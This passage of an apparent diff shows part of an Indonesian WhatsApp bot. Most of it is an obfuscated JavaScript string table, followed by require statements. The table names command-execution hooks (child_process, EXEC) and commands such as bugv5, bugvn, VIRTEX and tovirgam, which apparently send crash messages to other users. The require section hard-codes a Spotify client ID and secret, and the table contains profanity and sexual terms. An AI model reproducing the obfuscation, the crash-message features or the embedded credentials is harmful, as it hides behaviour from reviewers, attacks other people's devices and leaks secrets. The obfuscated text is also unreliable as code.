ttonsMessage|hallo|x20Mulai|x20Ditonton|wikipedia|protocol|cekWaktuTL|nom|ttp2blue|setdesk|Tomlol|child_process|x2062xnxx|searchWithMT|1616169743|x20Extream|F854aUrzgAkBTOVULpne4oSIi6S04Jo56pjZEo|mozila|ttp2pink|lirik|katailham|x22aku|x20AAAAAAAAAAAAAAAAAAAAGH|type4|neofetch|stdout|jadian|x20detected|x20buatmu|trava|x20cukup|x20umur|x20pesannya|32mEXEC|setgopay|getCklPosi|channel|hex|wangy|backup|x0aExample|x20why|x20Repost|bcgc|navy|Waktu|x20otomatis|cekWaktuCkl|mode|nightcore|359996400|1622815545|x20Disukai|detik|x20GEMPA|Set|del|x20SELF|x20SIAPAKAH|SUIT|x20PvP|x20Verified|highfive|addkata|tracks|x20dibeli|x20Rp1000|ttp2magenta|x20kontak|x20urutan|x20sesuai|batre|x20lucky|kebiasaan|x20terburuk|x20lo|x20sekolah|x20Bendera|x20manakah|delstik|totalmem|truth|sketch|1044|x20wangyy|x20nyiumin|x20aroma|x20wangynya|x20Level|setnamebot|Naon|x20kehed|x20nosinya|x20turn|x20of|x20tts|usernamenya|x20saipulanuar|igstory|posterize|x20Total|hollographic|_Success_|Sad|x20amat|x20ama|x20diri|x20sendiri|getSewaExpired|Left|humidity|exit|bcmember|x20teman|x20sukai|clearallban|x20simpan|x20server|x20Data|x20ketika|x20menyimpan|antv|x20Vn|3dneon|delvote|setimageinfo|ttdownloader|utf|save|unsharpen|internasional|jancok|is_private|x20gajelas|microsoft|playing|x20Rambutnya|x20aaah|x20rambutnya|x20pengen|x20elus|elus|x20AAAAAH|emojidex|13010Lgeyzm|x20Author|addstik|unban|Username|Menari|x20Video|sniper|Babi|x20No|public|beautiful|tanggaljadi|x0aUdara|kirek|gantengcek|topbalance|following|fox_girl|x20screenshot|x0aLaporan|x20tanggapi|tolink|stickertourl|groupUpdateSubject|count|pink|x0a_Thanks|delbadword|Full|x20Name|append|x20this|x0aBatu|x0aKertas|x0aGunting|x20ownerku|Target|x20Didalam|presentationml|presentation|x20Expired|linknya|album|Indie|Flower|ttf|24fa902ead26340f3df2c|clearalldb|openmoji|x20Key|sticker10|x20pukulin|bonyok|bugv5|burn|claim|samsung|addvn|x20githubnya|saipulanuar|v18|getname|mnazria|cekWaktuTK|insta|phone|x20Sewa|Kurang|x20ikan|scommand|sewacheck|Tanggalny|wordprocessingml|Tuh|x0aIngat|x0aDia|x20memperbaikin|x0akalo|x20reportbug|penggunaan|x0aQuery|x20check|42LczfTK|Goblok|x20bangsat|Kedua|x20niat|x0aSuit|ttppurple|x208|x20Yok|x20botnya|x20REPLY|cum|Tentu|x20eh|x20tapi|x20boong|timezone|sourcecode|vnlist|BUCIN|Mimpi|x20semalem|x20ANIME|sethumb|x20CLAIM|kamui|x20menantang|x20Menghapus|balasan|banlist|x20Country|x20Ashar|bugvn|x20ANTIHIDETAG|ABLabel|Ponsel|x0aEND|From|x20PUBLIC|Jncok|Buka|x20tautan|3568736NUlGnf|DONASI|x20VOICE|x20NOTE|x20nyata|x20Cuma|x20HALU|x20katamu|x20nggak|x20NGAAAAAAAAK|x20PERCAYA|x20ITU|x20DIA|x20NYATA|x20NGAAAAAAAAAAAAAAAAAK|x20BANGSAAAAAT|x20KENYATAAN|x20POKOKNYA|namabot|blackping|addanime|x20Place|videotourl|viewOnce|release_date|1634472176|sendFileFromUrl|tipewatak|createReadStream|trace|moe|x20ANTIVIRTEX|getSewaPosition|x20day|0x3ed|0x1dd|0x651|0x487|0xafb|0x561|0x5f8|anjing|0xb73|bajingan|0x40d|0x8de|0x9f7|0x9ec|0x3ba|bacot|0x3ae|0x1f7|0x3af|0x87f|0x6da|0x9cd|0xa9e|0x33e|0x2fb|0x85a|Kntl|0x663|KONTOL|0xa04|Kirek|0x328|0x27d|0x50d|0x52f|0x655|memek|0x61b|0xb0e|0x2c3|pler|Silit|0x781|0x3ea|tai|0x282|0x405|0x646|0x59a|0x33a|0x51d|0x38e|0x543|0x984|0x56c|zenzkey|0x29c|0x3f4|module|0x1aa|xdev|hasNewMessage|0x8ed|0x303|_0x565c02|liveLocation|_0xc38b00|_0x49257e|0x4c5|0x92c|_0x27dd27|0x471|0x833|_0x5cf605|Makassar|0xb55|_0x4185cb|_0x2cd4be|_0x29653c|_0xf8b085|_0x27b584|0x5aa|0x279|0x2ad|0x1ae|0x1fc|0x605|0xaec|0x2e8|0x9a4|0x7d5|0x3e5|bukan|0x1c3|0x281|0x22b|x20digunakan|0x245|0x7b1|0x588|0x526|0x36b|0x7be|0x589|0xa6b|There|x20somethings|x0aPlease|x20try|x20later|x20contact|0x582|0x644|0x974|0x3cd|0x495|0x844|0xa9b|0x5de|0xb46|0x1c0|0x583|0x91d|0x3bf|0x639|0x9f0|currencyCode|0x432|0x760|x0aFN|0xa98|0xa97|Am6FBfNf|E2f1VoGBXkPaNAy7L6Tw_HMavKrHEt48QM4|Yfj8SW7liSEnDakvyVlXVZQ1LJBC9idn09X7KHe8HTc|0x909|0x746|0xb44|7186|0x94b|isAnimated|ogg|x20codecs|0xafe|0xa3a|0x4d6|liveLocationMessage|0x377|0x49a|0x905|0x8d6|0x58f|0x90f|gifPlayback|0x78b|0x8c8|thumbnailUrl|0x861|0x2cf|0x680|0x515|displayname|0x49e|_0x3609ed|LOCATION|0xa2a|spreadsheetml|sheet|0x992|0xa60|0x6d6|0x42a|0x3f9|0x52a|pageCount|0x8a6|fileName|0x2e4|0x55b|0xabd|_0x20976e|0x731|0x9f3|0x96b|_0x117e87|0x6dd|_0x1bcc5f|0x791|0x64e|normalizeMention|0x748|done|0x21f|_0x39770b|_0x7b8c92|0x3b0|0x4d5|0xab4|0x392|ANTI|HIDETAG|0xb2f|0x87a|0x728|0xaf4|0x39b|0xacd|x0aSepertinya|x205x|x0aJangan|x20dikick|x20botz|0x4e20|VIRTEX|0x34b|0x28c|0x235|x20Tutup|0x3da|0x44|0x1f9|clearMessage|0x9c6|0x7f6|_0x17ffad|0x5cd|0xb38|0x329|0xae4|0x8b7|_0x4a2288|0x45d|0x65a|0x2b9|0x194|0x9c7|0x68b|0xaae|0x1a4|0x95e|0x9f9|0xb47|Kumaha|x20atuh|0x4f4|0x360|0x4e5|0x2a4|0x98d|0xb4e|0x693|0x97d|0x325|0x668|0x99b|0x990|0x5f1|0x9e9|0x706|0x672|addFilter|0x381|0x9e6|x20autoclear|0x8e3|0x18|0x430|0x372|x0aDan|but|0x496|0x2df|avaible|0x4ae|0x7f2|0xa90|0x30e|0x83f|0x48e|0xb2d|0x37d|0xa1d|0x479|0xb0a|0xacc|0x9b4|0x7dc|0xa74|x20berakhir|0x66b|0x37b|0x7bc|0xa00|0x254|0x7b2|0x9c9|0x627|0x4ad|0x714|0x78d|bitrate|0x80|0x7c5|prepareDisappearingMessageSettingContent|waitForAck|colors|0x94d|0xa13|0x944|gray|_0x305667|_0x55c44c|_0x139e00|_0x3dd343|_0x283d48|_0x9e087e|0x6f2|_0x5a143a|_0x5a794c|0x5c4|0x726|0x78e|0x7e2|0x8fd|0x946|0xb75|0xa4f|0x5b9|0x27c|0x4af|0x579|0x573|0x3d9|0xb0f|0x2c0|0x737|0xb25|0x52d|0x27b|getjawaban100|0xaaa|0x371|0x95c|Semua|x0aKirim|0x580|0x5d8|0x92b|Nyerah|x20BENDERA|0x26e|cekWaktuTA|0x9b9|0xa86|0x8f0|0x849|cekWaktuSA|isSiapaAku|0x3db|0x95d|0x911|Lirik|0x2f0|0x665|0x97c|0x541|0x61e|0x34f|0x266|0x1d5|0x8c1|0x43c|0xa6e|0xafa|_0x3681d7|0x5fc|0x2e7|0x9da|0xb3e|_0x447263|0x1f0|artist|0xaff|album_title|_0x4834e9|0x4ca|0x66f|0x61d|0x967|0x81c|_0x530900|0x6f0|0xb30|0x23b|0x230|0xad2|0x76c|0x29a|0x6c5|0x3fb|0x5eb|0x738|0x659|well|_0x5ddfc9|loc|0x68a|thumnail|0x935|0x7bf|0x19a|0x872|0x2f4|_0x198a40|0x1e8|0x7b3|0x996|x20v18|0x3a0|0x4a8|0x7f1|0x626|0xa4a|0x9e5|0x306|0x614|0xb3f|disposition|attachment|0x952|0xb7d|_0x5a4d97|0x3d3|0x26f|0x242|sys|0x69e|0x577|temp_max|0x9a6|0x67b|0x903|0xab2|0xa92|0x2c6|0x982|0x3dd|0x63e|0x1ec|0x210|_0x4ebb4c|0xa23|0x394|0xaeb|0x83b|0x309|0x697|0x37a|0x8c6|gempanow|0x550|0x539|0x4fd|0x6b6|0x4f8|0x450|0x3cb|0x2c2|0x6e8|0x953|0x2d5|0x8aa|0x8c3|0x7df|0x2c1|0x47c|0x9b5|0x2f2|x20GT|0x207|0x875|0x71c|templateMessage|hydratedTemplate|hydratedContentText|hydratedFooterText|hydratedButtons|urlButton|0x631|callButton|0x5a6|phoneNumber|0x3d5|x20Menu|Instagram|0x232|0x3b1|_0x2db8b5|0x8a4|0xa1f|0x45b|_0x2a08df|0x695|0x622|0x1d7|0xb3d|sendcontact|0xb4b|0x5a4|0x234|0x1e7|0x658|0x388|0x383|0x408|_0x21c66f|0x2b8|0x65c|0x46f|0x84b|lanjut|0x699|_0x4fd15a|0x4ed|0x6ef|0x5e4|0x516|0x218|0xb68|0x25f|0x960|0x652|0x600|0x7d4|poin|poin_lose|0x5a0|0x9aa|_0x5b3d97|0x243|0x283|approved|0x352|utatoo|0x9c8|0x65b|0x9f6|0x6be|sepia|scary|rip|0x208|0x21a|0x998|0x510|0x710|missionpassed|moustache|0x318|0x7b5|invert|0x826|0x1fb|0x565|0x30f|0x890|0x836|0x8ce|0x308|0x5e1|circle|challenger|0xa41|0xb1a|0x9fd|0x8a2|_0x58d887|0x862|0x5ff|0x995|0x8d1|background|0x62d|0x1c7|0x44b|0xaad|0x229|0xa2e|0x778|0x70b|free|1026|0x418|0x4e6|0x8b8|0x546|938|0x9be|0x6cb|0xb7b|0x35b|0x6c7|0x698|0x7cf|876|0x99d|0x8d8|0xa54|and|1012|0x7a6|0x277|0x8f8|0xa65|_0x212155|0x7e6|0x850|0x4d1|0x637|0x4bf|0x8c4|0x64b|0x77b|_0x42432f|0x192|0x8eb|x20Kali|0x275|0x289|0xa73|0x3f3|_0x355928|0xe4e1c0|0x5ac|0x7d8|_0x141b07|0x1312d00|0x478|0x74d|0x1f1|0xaa0|0x493|0x6b8|0x1ea|0x735|x20Ext|x20360p|0x5d6|0x55e|0x3cc|0xb5e|0x822|0x786|neonlight|with|981|thewall|wall|871|0x557|0x477|0x6de|0x25a|pencil|0x986|x20SHOP|0x2c5|0xb22|0x88d|0x86e|0x9ad|0x4c9|ttc|x20selesai|0x4ef|0x99f|0x321|x20membatalkan|x20permainan|hadiah|TicTacToe|0x523|0x48a|0x46d|0x94f|0x71b|0x261|0x8d9|0x1d0|0xaf9|0x38c|0x73b|0xafd|0x6ca|0x2e3|0x918|0x461|0x433|stod|0xa02|_IlvsY7S7j8|0x359|0x72e|0x3b3|0x683|0x882|0x61a|0x228|0x49d|0x305|0x525|x20ftoko|0x9b8|0x682|0xb5c|0x354|Quoted|x0a11|x0a12|0x4a3|0x8b5|0x3a6|0x32f|0xa78|0x679|0x958|0x66e|0x340|0x936|ori|0x36d|0x607|0x7ad|0x6f9|0xab0|0x886|0x427|blowjob|0x4e4|yuri|0xa7a|0x43a|hentai|0x586|0x4d9|erok|0x2ab|0x8b4|erokemo|0xa0b|0x4df|0x72c|0x1ac|0xb4a|0x28b|0x3bc|0x63b|0x5bf|0x25c|0x7f0|0x898|0x2d7|0x204|0x314|0x3a5|0xb0c|0x792|0x302|0x965|0x73e|0x8f6|0x7d1|0x316|0x2d9|kill|0x3d8|0x864|0xa57|0x37c|0x3b5|0x739|0x7c1|0x1ef|0x54b|0x870|0x3ec|0x513|0xa84|tafsirMimpi|0x2ed|0xb3a|0x6d1|0x4dc|0x4b8|0x757|0x9fe|0xabf|0x7de|0x53d|0x8b1|0x27e|rejekiweton|0xa5f|0x74a|0x2e6|0x701|0x6ba|0x44d|fromCharCode|0x200e|0x4c0|0xfa1|0x1e5|0x27a|0x733|0xa8b|0x3a9|0x60a|0x6bb|0xb51|bugv3|0x3b9ac9ff|0x7f5|0x570|hay|0x608|0x44e|0xa3f|0xa94|0x813|0x94a|0x260|0x641|0x801|0x8e5|x2015|0x416|0x1ce|0x81d|0x74e|0x4cb|0x499|0x99a|_0x26194f|_0x3f733b|_0x4ee74a|_0x1cfcd6|_0x12f697|_0x396821|_0x2799a4|_0x49a55a|_0x2876bc|0x707|0x33b|x20betul|_0x1f846d|_0x2cfd18|_0x5d0c09|_0x517cc6|_0x1ba708|_0x50543d|_0x333619|_0x2ebd93|_0x4a5320|0x799|0x7b0|0x62f|0x24d|0x90d|0x3e1|0x4e0|0x415|0x8a9|0xac6|x20BUGTROLI|0x73d|0x205|0x86c|0x95f|0x443|0x202|0x3e4|0x897|0x533|0xa5d|0x47b|0x93e|0x9dd|0x511|0x7bb|0x26d|0x24c|0x364|0x1b6|angin|x0aCuaca|x0aDeskripsi|0xa77|x0aKelembapan|0x5d9|0xb1c|0x5b7|0xa01|0x336|0x5d2|0x6a7|0x9a8|x20gunakan|x20PRIVATE|0x4bc|0xa17|0x406|0x1cd|0x895|0x68f|0x474|0x5d7|0x92e|0x77d|0x1fa|0x585|0x440|0x417|0x53a|autoclearall|0x447|0x5be|0x79a|0x62e|0x53b|0x67a|0x9cf|0x4b5|0xb72|0x891|0xaa6|0x38f|0xaa9|0x657|0x1e3|x20AUTOSTICKER|0x7a3|0x58b|x20beri|0x75c|0x459|0x962|0xb02|0x636|0x662|0x58e|x20BIO|0x835|0x6e5|0x8d7|delblockcmd|0x436|0x85d|0x1b4|_0x45cb26|0x677|0x6a1|0x426|x0aGituuuuuuu|0x386|0x2a0|0xa22|0x763|0xa0f|0x57e|0x8d2|0x4a1|0x749|0x29d|0x7a1|0x654|0xafc|0x2d0|0x38b|0x49f|clearallpc|0x594|clearallerror|0x43b|0x270|0x5b3|x20USER|delallblock|0x3b6|userblocked|0x970|0x6e1|0x9ab|0x4d8|0xb78|0x256|0x9fb|0x2cd|x20public|0x530|0x334|0x5fe|0x18f|setbotpp|x20gambarnya|0xb4f|0xb01|setpref|0x857|0x347|0x4ab|0x894|0x2d2|0x520|0x532|0x674|0x492|0xaa7|0x1ff|0x788|0x291|0x60f|0x255|0x6ed|0xa4c|kena|0x62c|0x41c|0x20c|0xa91|0x2f7|0x34a|0x489|0x3a4|0x839|0xa28|write|0x81f|0x2a3|0x776|x20gopay|0x89a|0x8e7|0x4e7|setimgreply|0x4ba|0x2ea|0x9e8|0x3f0|0x323|0x851|0x2fd|0x981|0xb31|imagenye|0x924|_0x12de90|0x5f6|0xa46|0x82d|0x313|0x349|0x20a|0x77a|0x3f5|0x98e|0x507|0x6c9|0x475|0x343|0xa19|0x465|0x53e|0x247|0x675|0x25e|0x7cc|0x1dc|0x274|0xa48|0x904|0x7ba|0xb2e|0x893|0x77e|0x4f1|0x941|0x50a|0xa4d|0x188|0x558|0x33f|0x51e|0xac4|0xb09|0x8a0|0xa52|0x46c|0x4e2|0xa44|0x379|orderlist|listorder|x20Order|x0aExpired|0x60c|0x93b|0x535|0x1d6|0x660|0x47f|0x24e|listused|0xb69|0xa11|0x562|0x4de|0x4b2|0x253|0x32d|0x876|0x5e0|0x783|0x5d3|0x4c3|0x96d|delpremium|x20delprem|Input|0x3aa|0x1ab|0xa49|0x837|0x3fd|addstory|0x949|0x216|0x42b|0x620|0x3c1|0xb7c|Sibuk|0x2328|0x8ff|0x2e0|0x22a|0x7c2|fetchUser|hd_profile_pic_url_info|0x9eb|0xa1a|fullname|0x4a4|biography|0x5ec|0x42c|0x401|0xa09|Private|0x9ce|0x5f0|0x5a7|0x599|0x262|twmp4hd|0x6d5|0x5ae|fotonya|0xa8a|0x2b1|gimage|0x69a|0x23f|0x852|_0x3f3492|x20Terjari|x20Kesalahan|x20Atau|0x387|0x8ad|insta_story|0xb19|0xaf7|0xae7|0x724|0x422|0x71e|0xae1|0x458|aml|0x32e|0x26b|0x6fc|igDownloader|0x755|_0x5b9fff|0xb3b|0x45c|0x5ea|0x913|0x1a0|0x4b6|0x715|0x61f|0xb23|0x6b2|x20close|0x476|0xa16|REVOKE|0x5a2|0x531|0x8fa|0x5a9|groupUpdateDescription|0x623|x20teksnya|0xa10|0x7af|0x6ac|0x6e3|revokeInvite|0x5b5|0x734|0xa96|0x47e|0x84c|0x795|0x551|0x333|0x64f|0x452|0x2a8|0x4ac|0x9fc|0xa85|0xab1|0x517|0xa58|0x892|kickme|0x7bd|0x65f|0x503|0x5f5|0x250|0xb40|x20private|x20acc|0x5f7|0x6d0|0x24f|0x1f2|0x7e5|0x1fe|0x1b9|0x8b2|0x5d0|0x4cc|0x6d4|0x7d2|0x24b|0x90c|0x2bd|0x1d9|0x40c|unbanned|0x9ea|0x814|0x625|0x271|0x3a3|0x772|0x729|0xab7|0x338|0x80e|0x8ee|0xb77|antidelete|0x3a7|0x764|0xae6|0x304|0x774|0x290|0x96a|0x6cf|0x617|0x473|0x397|0x33c|0xac3|0x907|0xa21|0xa71|0x2bb|0x18c|0x69f|0x6ec|metadete|0xa5a|0x82b|x20sewabot|x20Ketik|0x41b|0x9a2|0x7d3|0x500|EXPIRE|0x552|0x41d|0x239|0xb45|0x793|grupinfo|0x4c4|0xb41|0x1b3|0x62b|Dibuat|0x98f|0xa33|0xab9|x20Peserta|AntiLink|0x57d|0x1bd|0x39a|0x547|0x919|0x362|0x1ed|0x809|0x23a|0x3ee|0x797|0x404|0xaf5|0x740|0xaef|0x8a7|0x691|0x3c7|0x802|0x3c0|0x2e2|0x649|0x4dd|addfam|0x54f|0x97f|0x23c|addbendera|0x1db|0xaea|0x634|addgambar|0x521|0x7ef|0x6f8|0x6d3|0x587|tebakanime2|_0x1720a4|0x669|0x73c|x20hard_|0x947|0x244|0x628|nilai_1|tanda|0xb17|0x514|0x86b|acak|0x351|0x538|0x968|0x87b|0x1c9|0x8f7|_0x436bab|0x54e|0xa61|0xabe|_0x37d9e5|0x241|tourl|0x38a|0xb5d|0x2a1|0xab3|0xa0e|0x85e|0xa0d|0x19f|0x6a4|0xb74|0x2ac|0x4f3|0xae2|0x534|0x708|_0x4f03c6|0x18a|_0xb590d8|0x3e6|0x56b|0xb34|0x70f|0x413|0x87c|0x985|0x335|0xb29|x20ketakutan|x20terbesar|0x2b5|0x9a9|0x4f9|0x395|0x618|0x610|0x678|0x246|0x920|0x7a8|x20mendekati|x20idealmu|0x8d5|x20nolak|x20alasannya|x20kenapa|0x82f|0x80c|0x97e|0x63d|0x914|0x667|x20anggota|0x37e|x20recent|0x5ab|0x2c9|0x69d|0x51c|0x81b|x22gue|x20lucinta|x20luna|0x97b|0x694|0x4a2|0x860|0x572|0x1eb|0x9d2|0x2af|0x345|0x72a|0x896|x20BOWO|Pura|x20pura|x20maung|x20belalang|x20kulkas|x20dll|0xa07|0x725|0x744|0xae0|0x670|0x31e|0x6e2|0xb36|0x4ec|0x878|0x3c2|0x96f|0x425|0xa3e|0x19d|0x934|0x74c|0x9ac|x20Rp50|0xc350|0x9de|0x37f|0x504|0x3ef|0xb05|0x424|0x9ba|0x759|0xad4|0x84a|0x240|0x431|0x367|0x770|0x6e7|0x5b0|0x6f5|0xa45|0x9d8|0x5c2|0x2db|0xa36|0x9df|mes|0x6df|0x33d|htc|0xc|0x90e|softbank|0xe|0x785|0x5fa|0x10|klaim|0x53f|0xa89|0x544|x0aDari|x20harian|0x35e|0xac8|x20hour|x20minute|0x64c|0xaf0|0x2ef|0x455|0x727|0x964|0x681|0x7ae|0x98b|x20Pangkat|0x95b|0x999|x20Hit|0x498|0xb7a|0xa2f|0x9fa|0x7b8|0x3f7|0x66a|0xb3c|x0aBerhasil|x20teksChat|x0ajika|x0aakan|x20menjawab|0x98a|0xb56|0x973|x20dicari|x20um|0xa4e|0x3bd|astetick|0x742|0x211|megayaa|randomaesthetic|0x35c|0x567|0x412|0x36c|x20KODE|x20BAHASA|x20af|x20Afrikaans|x20sq|x20Albanian|x20ar|x20Arabic|x20hy|x20Armenian|x20ca|x20Catalan|China|Taiwan|yue|Cantonese|x20hr|x20Croatian|x20cs|x20Czech|x20da|x20Danish|x20nl|x20Dutch|Australia|x20Kingdom|x20eo|x20Esperanto|x20fi|x20Finnish|x20fr|x20French|x20de|x20German|x20el|x20Greek|x20ht|x20Haitian|x20Creole|x20hi|x20Hindi|x20hu|x20Hungarian|x20Icelandic|x20Indonesian|x20it|x20Italian|x20ja|x20Japanese|x20ko|x20Korean|x20la|x20Latin|x20lv|x20Latvian|x20mk|x20Macedonian|x20Norwegian|x20pl|x20Polish|Brazil|x20ro|x20Romanian|x20ru|x20Russian|x20sr|x20Serbian|x20sk|x20Slovak|Spain|x20sw|x20Swahili|x20sv|x20Swedish|x20ta|x20Tamil|x20th|x20Thai|x20tr|x20Turkish|x20vi|x20Vietnamese|x20cy|x20Welsh|0xb1b|0x93c|0x8ec|0x376|_0x132245|0x1de|0xb28|0x723|0xb67|0x4e1|_0x5a499a|0x7ce|0x8d0|0x257|0x8c7|wallml|0x83e|0x4d3|OWNER|0xb26|0x692|encodeURI|0x859|ttpred|0x299|0x43f|0x5d4|0xa75|0x470|0x752|0x761|0x224|0x825|0x8f9|0x62a|0x5bd|0x910|0x971|0x765|0x880|ttp2violet|0xad1|0x389|0x324|0x969|0x933|0x45f|0x58c|0x988|0x9dc|0x578|0xb1e|0x915|0xaa8|0x721|x20laptop|x20ngeliatin|x20percaya|x20aaaaaaaaaaah|x20syukur|x20merelakan|0x571|x20SENDIRI|x20PUN|x20AAAAAAAAAAAAAAH|0x91c|0x1d1|0x423|0x285|0x47d|0x922|0x3b2|0x8f1|0x70c|0xa62|0x666|0x28d|0x54c|0x78c|0x1cf|0x912|0x4c6|0x34c|0xa81|0x5f3|0x28a|0x601|0x937|0x342|0x7ab|0x222|0x221|0xa7b|0x396|0x4db|0xb4d|Ulangi|x20paham|x20anjir|0xace|Besok|Lusa|0x9f1|0xb08|0x874|0x87d|0x357|0xb2a|0x96e|0x972|0x6f1|0x353|0xb15|0x8ac|0xb20|0x83c|0x1c8|x20lag0i|0x1c4|0x391|0x6b3|0x630|x20lah|0xad9|0x640|0x784|0x6aa|0x486|Knpa|x20yak|0xb60|0x414|Kita|x20Kenal|0x4ea|0x18b|0x684|0xb4c|0xa53|0xa55|0x6ff|Whahahaha|0x592|0x89b|0x5b6|0x856|0xa06|0x4a7|0x420|0x7f3|Pemarah|Pemaaf|Penurut|0x7ed|Baperan|0x1c1|penyabar|0x59d|top|x20pokoknya|Suka|x20Membantu|0x671|x20Atok|Mabar|0x732|0x223|0x59f|0x4f6|0x848|Naik|x20Motor|0xb57|0x9ee|Bertumbuk|0xb70|0x467|Maen|Berbicara|_0x575a36|0x3e7|0x569|x20Beban|tovirgam|0x497|0x980|x20Fotonya|Perhatian|x0aFoto|x20Mengandung|x20Virgam|Bug|x20SW|0x2b6|0x80d|0x5e9|0x843|0x419|0xa0c|0x402|0x6f7|0x508|0x800|0xb18|0x1e9|0x2f8|0xa14|0x298|0x3df|x20Id|0xb14|0x688|0x753|0x820|0x4b4|0x2a9|0x576|0xb66|0x991|0x8bc|Maksimal|x20volume|0x35d|0xb37|_0x10a939|_0x235317|delchat|0x209|0x754|0x2b4|0xac9|0x2ec|0x464|0x1f8|0x3c5|0x978|0x366|Open|0x52b|0x6c6|0x69b|0x963|0xb54|0xac5|0x9b6|0x85c|0xb32|0x407|0x288|0x3c9|0xaee|0x943|0x6c2|0x632|0x51a|0x7b4|400|0x84e|getfp|getpp|0x89f|0xb5b|0x88a|getbio|0x45a|0x887|0x15751bf0|0x9bf|0x73f|0xa8e|0x46b|x20reason|0x4f5|0x36a|0x524|0x8e8|0x2bf|caripesan|0x56e|0x200|0x509|0x923|_0x18d63a|0x332|0x322|0x702|0x34e|0x789|0x2b3|0x95a|0xa9c|0x44c|0x8b3|0xa30|0x7d9|0xb12|0x6a0|0xa18|0x59e|0x60e|0x9db|0x98c|0x1cc|forwardtotal|totalforward|0x805|0x4e3|0x1bc|0x2ae|0x5ce|_0x3413db|_0x200e7e|x20ngab|x20penggunaan|0x28e|0x31f|0x361|_0xa08c5f|_0x1af52f|3486|_0xd46f1b|_0x268ddd|0x60b|44100|_0x90ce06|_0x79bb28|0x7f4|0x2a5|_0x5be338|_0x159f2e|_0x5d4f9a|_0x1ef35c|0x4ee|0xb10|0xa37|x20reverse|x20areverse|0xa7e|0x762|x20sc|dZRGjP|YcLU|detecLinks|0x7da|0x330|0x60d|Contoh|0x906|0x355|0x20b|0x310|NIH|0x1e6|0xa4b|0x9a3|0xb0b|0x575|x20Wawan|x20makan|0x4e8|typeof|0x75e|0x823|0x1ee|0x9d7|0x35a|detectLinks|0x5fb|0x6ad|0x185|0xb35|delerror|0x767|0x815|0x2aa|0xa2b|delvn|0x3fc|0x603|Sticker|0x664|0xa80|0x9bd|0x536|x20mengambil|0x4c8|setexif|x20gan|0xb16|0x4c1|0xae8|0x296|0x648|0x78f|0x265|0x21b|0x8fe|0x369|0x3d1|0x434|0x445|x0aNote|x20maximal|0x2dd|0x7a0|apiKey|0x7e8|0x196|0x807|0xb6a|0xb13|x20stickenya|0x485|0x6e9|0xa6a|0xaf1|0x8bf|x20Cmd|0xb5f|0x6c3|0x4cf|0x59b|0x6c4|0x3c6|0x4bb|0x68e|0x225|read_only|0x9a5|0x653|listpc|0x5f9|x20PERSONAL|0x8bd|0xacf|0x9d1|0x7ac|0x32a|0x190|0x7c0|0x574|0x902|0x71a|PERTANYAAN|0x932|answers|JAWABAN|x20Brainly_|0x642|0x780|SELF|0x1e0|0x4fb|0x25b|0x26a|0xada|ping|_0x266b50|0x91b|_0x35ca35|_0x150938|Memory|0x41a|0x79d|x20Second|0x769|inspect|0x76e|0x236|_0x782803|0xb1f|0x67d|0x5c3|0x79e|0x1b7|0x8c9|0xb49|0x3ad|0x24a|0x2fe|0x30d|0x954|0x5e8|0x959|0x596|0x9e0|0x8ae|0x2dc|0x716|0x5dd|0x6e4|0x36e|0x42f|x20Ban|0x203|0x5c1|0x8df|0x522|tagall|0x368|_0x50d073|0x775|0xa99|x20Info|0x45e|0xa68|0x7b9|0xaa3|0x7a9|0xa3b|0x6d8|0x1a2|0x6c8|0xb24|x20gebukin|x20babak|x20belur|0xa3d|0x3e0|0x838|0x555|0x5b8|0x2f5|Promise|php|Result|sewalonte|0x446|0xb59|0x834|0x197|0x9e2|sticker01|0x7d7|sticker06|sticker07|0x501|0xa3c|0x444|0x84d|0x3ff|0x945|0x7fc|0xfa0|Ucap|x20salam|x20napah|0x284|0x7b7|Walaikumsalam|0x27f|0x6b5|0x9c2|0x454|0x231|0x42e|0x54a|0xb6c|0x9bb|0x215|0xa25|0x2f9|0x616|0x5a5|0xad7|0xaa1|0x91f|0x3a2|Pahami|x20peraturan|x20menerima|0x30a|0x187|Enaknya|x20apain|memoryUsage|0x676|0x4b3|0x983|_0x1202a7|_0x4526f9|wa_version|mcc|mnc|os_version|device_manufacturer|device_model|0xa51|0x409|_0x81df74|0x8bb|0x9af|0x410|0x2e1|0x5ed|0x80f|0x4a0|0x8be|0x295|0xa66|0x74f|0x5a8|0x1af|0x398|0x9ae|x20users|x20memberikan|x20informasi|x20pribadi|x20menemukan|x20langsung|x20memakai|x20Beberapa|x20sampai|x20meperbaiki|x20Report|x20terkecuali|x20menyebabkan|x20Anti|x20Spam|x20spam|x20dilarang|x20keras|x20menelpon|x20melanggar|x20terkena|x20nomernya|0x82a|0x337|0xabc|x09|Return|0x72d|0xa27|0x925|args|0x9b7|0x841|0x6a5|0x3fa|0x8da|x20Subuh|0x505|0x612|0x40b|0x348|Siang|x20Dah|x20blm|0x7a5|0x307|0x8d4|0x830|0x4fa|0xa93|0x1a8|0x5ef|0x72b|0x931|0x67f|0xa76|0x466|0x2fc|0x3e2|0x929|0x798|0x845|0x378|0x1b5|BaileysError|x20Not|x20expecting|x20response|0x2fa|0xb62|x20Yahaha|x20pasti|x20paket|0x411|0x429|0x3a1|0x593|0x8ef|0x1d3|0x5cb|0xa69|0x705|0x56a|0x9bc'.split('|'),0,{}))
+const songlyrics = require('songlyrics').default
+const Spotify = require('spotifydl-core').default
+const spotify = new Spotify({
+clientId: 'acc6302297e040aeb6e4ac1fbdfd62c3',
+clientSecret: '0e8439a1280a43aba9a5bc0a16f3f009'
+})
+const {
+youtubeSearch,
+mediafiredl, 
+lyricsv2, 
+lyrics, 
+facebookdl, 
+facebookdlv2,
+tiktokdl, 
+tiktokdlv2, 
+twitterdl, 
+twitterdlv2,
+getZodiac,
+liputan6,
+googleIt, 
+wallpaperv2, 
+googleImage, 
+alquran, 
+jadwalTVNow, 
+gempa, 
+gempaNow} = require('@bochilteam/scraper')
+const { SoundCloud } = require("scdl-core");
+const CuteFFMPEG = require("cute-ffmpeg").CuteFFMPEG;
+const FFMPEGRequest = require("cute-ffmpeg").FFMPEGRequest;
+const Ffmpeg = new CuteFFMPEG({
+  overwrite: true
+});
+
+// stickwm
+const Exif = require('./lib/exif');
+const exif = new Exif();
+
+
+
+ //------------------ LIB FILE ------------------\\
+const {parseMention, FileSize, weton,week,calender,dateIslamic,formatDate, isUrl, makeid, calculate_age, generateMessageTag, runtime, randomNomor, jsonformat, generateProfilePicture, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
+const { color, bgcolor } = require('./lib/color.js')
+const hx = require("./lib/hxz-api")
+const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetcher')
+const { styleText, baseURI, upload, buffer2Stream, stream2Buffer, ythd} = require('./lib/ytdl')
